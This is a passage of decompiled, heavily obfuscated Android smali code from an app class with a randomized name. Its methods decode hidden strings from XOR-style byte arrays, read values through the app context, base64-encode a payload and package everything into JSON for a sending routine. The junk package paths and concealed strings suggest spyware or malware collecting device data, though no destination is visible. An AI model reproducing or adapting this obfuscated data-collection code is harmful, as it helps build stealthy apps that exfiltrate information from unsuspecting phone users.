    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    const/4 v2, 0x4

    new-array v3, v2, [B

    fill-array-data v3, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x3

    new-array v5, v4, [B

    fill-array-data v5, :array_6

    new-array v6, v1, [B

    fill-array-data v6, :array_7

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {p1, v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    new-array v5, v2, [B

    fill-array-data v5, :array_8

    new-array v6, v1, [B

    fill-array-data v6, :array_9

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    new-array v6, v2, [B

    fill-array-data v6, :array_a

    new-array v7, v1, [B

    fill-array-data v7, :array_b

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-static {p1, v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    new-array v6, v4, [B

    fill-array-data v6, :array_c

    new-array v7, v1, [B

    fill-array-data v7, :array_d

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_e

    new-array v6, v1, [B

    fill-array-data v6, :array_f

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/16 v6, 0xa

    new-array v6, v6, [B

    fill-array-data v6, :array_10

    new-array v7, v1, [B

    fill-array-data v7, :array_11

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v0, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v2, [B

    fill-array-data v0, :array_12

    new-array v6, v1, [B

    fill-array-data v6, :array_13

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v6, 0x6

    new-array v6, v6, [B

    fill-array-data v6, :array_14

    new-array v7, v1, [B

    fill-array-data v7, :array_15

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v0, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v4, [B

    fill-array-data v0, :array_16

    new-array v4, v1, [B

    fill-array-data v4, :array_17

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p0, v2, [B

    fill-array-data p0, :array_18

    new-array v0, v1, [B

    fill-array-data v0, :array_19

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v5, p0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    new-array p0, v2, [B

    fill-array-data p0, :array_1a

    new-array v0, v1, [B

    fill-array-data v0, :array_1b

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v5, p0, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    invoke-virtual {v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->E(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        0x38t
        -0x5at
    .end array-data

    nop

    :array_1
    .array-data 1
        0x71t
        -0x1et
        0x2ct
        0x62t
        0xdt
        0x4bt
        -0x54t
        0x6ft
    .end array-data

    :array_2
    .array-data 1
        -0x66t
        0xat
        -0x10t
        -0x2ct
        -0x76t
        -0x2et
        -0x48t
        0x4ft
    .end array-data

    :array_3
    .array-data 1
        -0x22t
        0x6ft
        -0x7at
        -0x43t
        -0x17t
        -0x49t
        -0x2ft
        0x2bt
    .end array-data

    :array_4
    .array-data 1
        -0x53t
        0x48t
        0x30t
        -0x6t
    .end array-data

    :array_5
    .array-data 1
        -0x6t
        0x3bt
        0x53t
        -0x78t
        0x6dt
        0x56t
        -0x79t
        0x69t
    .end array-data

    :array_6
    .array-data 1
        0x2ft
        -0x4ct
        0x5ft
    .end array-data

    :array_7
    .array-data 1
        0x18t
        -0x7at
        0x6ft
        -0x68t
        -0x2bt
        -0x19t
        -0x27t
        0x71t
    .end array-data

    :array_8
    .array-data 1
        0x51t
        0x1ft
        0x67t
        0x27t
    .end array-data

    :array_9
    .array-data 1
        0x19t
        0x6ct
        0x4t
        0x55t
        0x5et
        0x5dt
        -0xft
        0x4dt
    .end array-data

    :array_a
    .array-data 1
        -0x3t
        -0x5at
        0x37t
        0x69t
    .end array-data

    :array_b
    .array-data 1
        -0x34t
        -0x6ct
        0xft
        0x59t
        -0x2t
        0x3ft
        -0x41t
        0x28t
    .end array-data

    :array_c
    .array-data 1
        -0x20t
        -0x18t
        0x41t
    .end array-data

    :array_d
    .array-data 1
        -0x70t
        -0x7ft
        0x25t
        0x54t
        -0x5t
        0x48t
        0x6bt
        -0x7at
    .end array-data

    :array_e
    .array-data 1
        -0x3dt
        -0x41t
        -0x13t
        0x31t
        0x73t
    .end array-data

    nop

    :array_f
    .array-data 1
        -0x56t
        -0x35t
        -0x6ct
        0x41t
        0x16t
        0x69t
        0x30t
        -0x70t
    .end array-data

    :array_10
    .array-data 1
        -0x6dt
        -0x14t
        0x2bt
        -0x6at
        -0x79t
        -0xat
        -0x1et
        0x40t
        -0x52t
        -0xct
    .end array-data

    nop

    :array_11
    .array-data 1
        -0x40t
        -0x80t
        0x59t
        -0x37t
        -0x1ct
        -0x66t
        -0x75t
        0x25t
    .end array-data

    :array_12
    .array-data 1
        0x26t
        0x52t
        0x62t
        0x48t
    .end array-data

    :array_13
    .array-data 1
        0x55t
        0x27t
        0x0t
        0x2bt
        0x25t
        -0x66t
        -0x6bt
        0x59t
    .end array-data

    :array_14
    .array-data 1
        -0x35t
        0x66t
        -0x49t
        0x69t
        -0xdt
        -0x10t
    .end array-data

    nop

    :array_15
    .array-data 1
        -0x48t
        0x5t
        -0x3bt
        0xct
        -0x6at
        -0x62t
        -0x21t
        0x30t
    .end array-data

    :array_16
    .array-data 1
        0x57t
        -0x28t
        -0xet
    .end array-data

    :array_17
    .array-data 1
        0x3et
        -0x4bt
        -0x6bt
        -0x58t
        0x2et
        -0x52t
        -0x6t
        -0x4ct
    .end array-data

    :array_18
    .array-data 1
        0x49t
        0x54t
        -0x2ct
        -0x80t
    .end array-data

    :array_19
    .array-data 1
        0x3et
        0x39t
        -0x45t
        -0x1et
        -0x59t
        0x67t
        -0x7bt
        0x2bt
    .end array-data

    :array_1a
    .array-data 1
        -0x41t
        0x25t
        0xdt
        -0x62t
    .end array-data

    :array_1b
    .array-data 1
        -0x29t
        0x48t
        0x62t
        -0x4t
        0x4t
        -0x19t
        -0x16t
        -0x48t
    .end array-data
.end method

.method private static synthetic y([BLandroid/content/Context;)V
    .locals 9

    .line 1
    const/4 v0, 0x0

    :try_start_0
    invoke-static {p0, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p0

    const/4 v0, 0x2

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    const/4 v2, 0x4

    new-array v3, v2, [B

    fill-array-data v3, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x3

    new-array v5, v4, [B

    fill-array-data v5, :array_6

    new-array v6, v1, [B

    fill-array-data v6, :array_7

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {p1, v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    new-array v5, v2, [B

    fill-array-data v5, :array_8

    new-array v6, v1, [B

    fill-array-data v6, :array_9

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    new-array v6, v2, [B

    fill-array-data v6, :array_a

    new-array v7, v1, [B

    fill-array-data v7, :array_b

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-static {p1, v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    new-array v6, v4, [B

    fill-array-data v6, :array_c

    new-array v7, v1, [B

    fill-array-data v7, :array_d

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_e

    new-array v6, v1, [B

    fill-array-data v6, :array_f

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/16 v6, 0xa

    new-array v7, v6, [B

    fill-array-data v7, :array_10

    new-array v8, v1, [B

    fill-array-data v8, :array_11

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v0, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v2, [B

    fill-array-data v0, :array_12

    new-array v7, v1, [B

    fill-array-data v7, :array_13

    invoke-static {v0, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v6, v6, [B

    fill-array-data v6, :array_14

    new-array v7, v1, [B

    fill-array-data v7, :array_15

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v0, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v4, [B

    fill-array-data v0, :array_16

    new-array v4, v1, [B

    fill-array-data v4, :array_17

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p0, v2, [B

    fill-array-data p0, :array_18

    new-array v0, v1, [B

    fill-array-data v0, :array_19

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v5, p0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    new-array p0, v2, [B

    fill-array-data p0, :array_1a

    new-array v0, v1, [B

    fill-array-data v0, :array_1b

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v5, p0, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    invoke-virtual {v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->E(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void

    :array_0
    .array-data 1
        -0xft
        -0x12t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x48t
        -0x56t
        0x79t
        -0x72t
        0x29t
        0x1at
        -0x47t
        0x55t
    .end array-data

    :array_2
    .array-data 1
        -0x13t
        0x7et
        0x65t
        0x79t
        0x0t
        -0x40t
        0x5ct
        0x24t
    .end array-data

    :array_3
    .array-data 1
        -0x57t
        0x1bt
        0x13t
        0x10t
        0x63t
        -0x5bt
        0x35t
        0x40t
    .end array-data

    :array_4
    .array-data 1
        0x24t
        -0x75t
        -0x5ct
        0x3et
    .end array-data

    :array_5
    .array-data 1
        0x73t
        -0x8t
        -0x39t
        0x4ct
        -0x51t
        -0x3ft
        0x3t
        -0x5at
    .end array-data

    :array_6
    .array-data 1
        0x77t
        0x2et
        0x2ft
    .end array-data

    :array_7
    .array-data 1
        0x40t
        0x1ct
        0x1ft
        0x35t
        -0x74t
        0x40t
        0x38t
        0x43t
    .end array-data

    :array_8
    .array-data 1
        0x6ct
        0x76t
        -0x3bt
        0x39t
    .end array-data

    :array_9
    .array-data 1
        0x24t
        0x5t
        -0x5at
        0x4bt
        0x70t
        -0x1dt
        0x2at
        0x5ct
    .end array-data

    :array_a
    .array-data 1
        0x26t
        -0x37t
        0x64t
        0x22t
    .end array-data

    :array_b
    .array-data 1
        0x17t
        -0x5t
        0x5ct
        0x12t
        0x5t
        0x6t
        0x21t
        0x65t
    .end array-data

    :array_c
    .array-data 1
        -0xct
        0x13t
        0x3et
    .end array-data

    :array_d
    .array-data 1
        -0x7ct
        0x7at
        0x5at
        0x4t
        0x39t
        0x52t
        -0x13t
        0x12t
    .end array-data

    :array_e
    .array-data 1
        0x75t
        -0x1ct
        0x4t
        -0x7ct
        0x7at
    .end array-data

    nop

    :array_f
    .array-data 1
        0x1ct
        -0x70t
        0x7dt
        -0xct
        0x1ft
        -0x7et
        -0x17t
        -0x3bt
    .end array-data

    :array_10
    .array-data 1
        0x16t
        -0x21t
        0x3ft
        -0x33t
        0x1bt
        -0x3et
        0x60t
        -0x63t
        0x2bt
        -0x39t
    .end array-data

    nop

    :array_11
    .array-data 1
        0x45t
        -0x4dt
        0x4dt
        -0x6et
        0x78t
        -0x52t
        0x9t
        -0x8t
    .end array-data

    :array_12
    .array-data 1
        -0x13t
        -0x2t
        -0x6ft
        0x5ft
    .end array-data

    :array_13
    .array-data 1
        -0x62t
        -0x75t
        -0xdt
        0x3ct
        0x3et
        0x73t
        0x53t
        0x4bt
    .end array-data

    :array_14
    .array-data 1
        -0x7ct
        0x25t
        0x6ft
        0x5ct
        -0x5et
        0xft
        0x4dt
        0x37t
        -0x68t
        0x32t
    .end array-data

    nop

    :array_15
    .array-data 1
        -0x9t
        0x46t
        0x1dt
        0x39t
        -0x39t
        0x61t
        0x3et
        0x5ft
    .end array-data

    :array_16
    .array-data 1
        -0x21t
        0x18t
        0x6et
    .end array-data

    :array_17
    .array-data 1
        -0x4at
        0x75t
        0x9t
        -0x22t
        -0x1at
        -0x19t
        -0x5bt
        0x78t
    .end array-data

    :array_18
    .array-data 1
        -0x68t
        -0x32t
        0x77t
        0x11t
    .end array-data

    :array_19
    .array-data 1
        -0x11t
        -0x5dt
        0x18t
        0x73t
        -0x63t
        0x3at
        -0x1et
        0x53t
    .end array-data

    :array_1a
    .array-data 1
        0x2ct
        0x28t
        0x8t
        -0x16t
    .end array-data

    :array_1b
    .array-data 1
        0x44t
        0x45t
        0x67t
        -0x78t
        -0x1at
        -0x52t
        0x24t
        0x22t
    .end array-data
.end method

.method private static synthetic z(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 5

    .line 1
    const/4 v0, 0x2

    :try_start_0
    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    if-nez p0, :cond_0

    return-void

    :cond_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const/4 v2, 0x3

    new-array v3, v2, [B

    fill-array-data v3, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 p0, 0x5

    new-array p0, p0, [B

    fill-array-data p0, :array_6

    new-array v3, v1, [B

    fill-array-data v3, :array_7

    invoke-static {p0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    const/16 v3, 0xa

    new-array v3, v3, [B

    fill-array-data v3, :array_8

    new-array v4, v1, [B

    fill-array-data v4, :array_9

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, p0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 p0, 0x4

    new-array p0, p0, [B

    fill-array-data p0, :array_a

    new-array v3, v1, [B

    fill-array-data v3, :array_b

    invoke-static {p0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, p0, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p0, v2, [B

    fill-array-data p0, :array_c

    new-array p1, v1, [B

    fill-array-data p1, :array_d

    invoke-static {p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, p0, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->E(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        -0x38t
        0x73t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x7ft
        0x37t
        -0x58t
        0x4et
        -0x29t
        0x4et
        -0x45t
        0x40t
    .end array-data

    :array_2
    .array-data 1
        -0x55t
        -0x19t
        0x35t
        0x12t
        -0x60t
        -0x66t
        -0x10t
        -0x6bt
    .end array-data

    :array_3
    .array-data 1
        -0x11t
        -0x7et
        0x43t
        0x7bt
        -0x3dt
        -0x1t
        -0x67t
        -0xft
    .end array-data

    :array_4
    .array-data 1
        0x18t
        -0x1ct
        -0x69t
    .end array-data

    :array_5
    .array-data 1
        0x68t
        -0x73t
        -0xdt
        0x2dt
        0x2ft
        0x23t
        0x15t
        -0x7et
    .end array-data

    :array_6
    .array-data 1
        -0x3at
        0x26t
        0x5et
        -0x43t
        -0x1at
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x51t
        0x52t
        0x27t
        -0x33t
        -0x7dt
        -0xet
        0xdt
        -0x63t
    .end array-data

    :array_8
    .array-data 1
        0x6ft
        0x73t
        -0x4dt
        -0x6at
        0x6bt
        -0x36t
        0x63t
        -0x6bt
        0x52t
        0x6bt
    .end array-data

    nop

    :array_9
    .array-data 1
        0x3ct
        0x1ft
        -0x3ft
        -0x37t
        0x8t
        -0x5at
        0xat
        -0x10t
    .end array-data

    :array_a
    .array-data 1
        -0x5et
        -0x7bt
        0x11t
        -0x2ct
    .end array-data

    :array_b
    .array-data 1
        -0x2ft
        -0x10t
        0x73t
        -0x49t
        -0x54t
        -0x50t
        -0x47t
        0xat
    .end array-data

    :array_c
    .array-data 1
        -0x35t
        -0x80t
        -0x69t
    .end array-data

    :array_d
    .array-data 1
        -0x5at
        -0xdt
        -0x10t
        -0x68t
        0x63t
        -0x57t
        0x1ft
        -0x3dt
    .end array-data
.end method


# virtual methods
.method public B()V
    .locals 1

    .line 1
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    invoke-direct {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->q()V

